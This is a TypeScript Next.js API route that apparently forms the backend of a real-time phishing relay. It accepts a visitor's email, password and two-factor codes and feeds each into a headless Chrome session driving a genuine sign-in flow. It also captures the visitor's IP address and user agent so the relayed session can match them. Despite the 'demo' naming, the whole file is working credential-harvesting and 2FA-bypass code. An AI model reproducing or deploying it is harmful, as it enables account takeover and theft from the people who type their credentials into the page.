import {
  createSession,
  getDemoSession,
  setChromeError,
  submitCaptcha,
  submitConfirmPassword,
  submitTwoFactor,
  clearInputError,
} from "@/lib/demo-session";
import { BrowserCapacityError, getBrowserSessionManager } from "@/lib/browser-session-manager";
import {
  startPhantom,
  phantomFillEmail,
  phantomFillPassword,
  phantomFill2FA,
  phantomSelectMethod,
  phantomTryAnotherWay,
} from "@/lib/phantom";

export const dynamic = "force-dynamic";

export async function GET(request: Request) {
  const { searchParams } = new URL(request.url);
  const sessionId = searchParams.get("sessionId");
  if (!sessionId) return Response.json(null, { status: 400 });
  const session = getDemoSession(sessionId);
  if (!session) return Response.json(null, { status: 404 });
  return Response.json(session);
}

export async function POST(request: Request) {
  const body = (await request.json()) as
    | { action: "enter" }
    | { action: "submitEmail"; sessionId: string; email: string }
    | { action: "submitPassword"; sessionId: string; password: string }
    | { action: "submitConfirmPassword"; sessionId: string; password: string }
    | { action: "submitTwoFactor"; sessionId: string; code: string }
    | { action: "selectMethod"; sessionId: string; challengeType: string }
    | { action: "tryAnotherWay"; sessionId: string }
    | { action: "submitCaptcha"; sessionId: string }
    | { action: "clearError"; sessionId: string }
    | { action: "leave"; sessionId: string };

  if (body.action === "enter") {
    const ua = request.headers.get("user-agent") ?? "";
    const forwarded = request.headers.get("x-forwarded-for");
    const userIp = forwarded ? forwarded.split(",")[0].trim() : undefined;
    const entry = createSession(ua);
    try {
      await getBrowserSessionManager().reserveSession(entry.sessionId);
      void startPhantom(entry.sessionId, userIp);
    } catch (err) {
      const message = err instanceof BrowserCapacityError
        ? "Ambiente ocupado. Tente novamente em instantes."
        : err instanceof Error
          ? err.message
          : "Nao foi possivel reservar uma sessao do Chrome.";
      setChromeError(entry.sessionId, message);
    }
    return Response.json(entry);
  }

  const { sessionId } = body;

  if (body.action === "submitEmail") {
    // Não avança o step aqui — o Chrome confirma o email e avança via phantom
    void phantomFillEmail(sessionId, body.email);
    return Response.json(getDemoSession(sessionId));
  }
  if (body.action === "submitPassword") {
    // Não avança o step aqui — o Chrome confirma a senha e avança via phantom
    void phantomFillPassword(sessionId, body.password);
    return Response.json(getDemoSession(sessionId));
  }
  if (body.action === "submitConfirmPassword") {
    return Response.json(submitConfirmPassword(sessionId, body.password));
  }
  if (body.action === "submitTwoFactor") {
    void phantomFill2FA(sessionId, body.code);
    return Response.json(submitTwoFactor(sessionId, body.code));
  }
  if (body.action === "selectMethod") {
    void phantomSelectMethod(sessionId, body.challengeType);
    return Response.json(getDemoSession(sessionId));
  }
  if (body.action === "tryAnotherWay") {
    void phantomTryAnotherWay(sessionId);
    return Response.json(getDemoSession(sessionId));
  }
  if (body.action === "clearError") {
    return Response.json(clearInputError(sessionId));
  }
  if (body.action === "leave") {
    await getBrowserSessionManager().closeSession(sessionId, "signin-leave");
    return Response.json({ ok: true });
  }
  return Response.json(submitCaptcha(sessionId));
}
